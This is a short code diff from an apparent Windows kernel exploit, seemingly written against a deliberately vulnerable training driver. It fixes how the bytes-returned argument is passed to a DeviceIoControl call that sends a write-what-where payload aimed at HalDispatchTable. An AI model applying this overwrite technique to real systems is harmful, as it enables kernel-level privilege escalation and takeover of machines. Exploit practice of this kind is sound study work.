@@ -101,7 +101,7 @@ int main()
 	HMODULE ntkrnlpaUserBase;
 	PVOID halDispatchTableAddress;
 	PPayload payload = NULL;
-	LPDWORD BytesReturned;
+	DWORD BytesReturned = 0;
 
 	payload = (PPayload) HeapAlloc(GetProcessHeap(),
 		HEAP_ZERO_MEMORY,
@@ -160,7 +160,7 @@ int main()
 	payload -> what = (PULONG_PTR) & ptr ;
 	payload -> where = (PULONG_PTR) whereAddress;
 
-	DeviceIoControl(hDevice, 0x0022200B, (LPVOID) payload, sizeof(Payload), NULL, 0, BytesReturned, NULL);
+	DeviceIoControl(hDevice, 0x0022200B, (LPVOID) payload, sizeof(Payload), NULL, 0, &BytesReturned, NULL);
 
 	HMODULE ntdll = LoadLibrary("ntdll.dll");
 	ULONG Interval = 0;
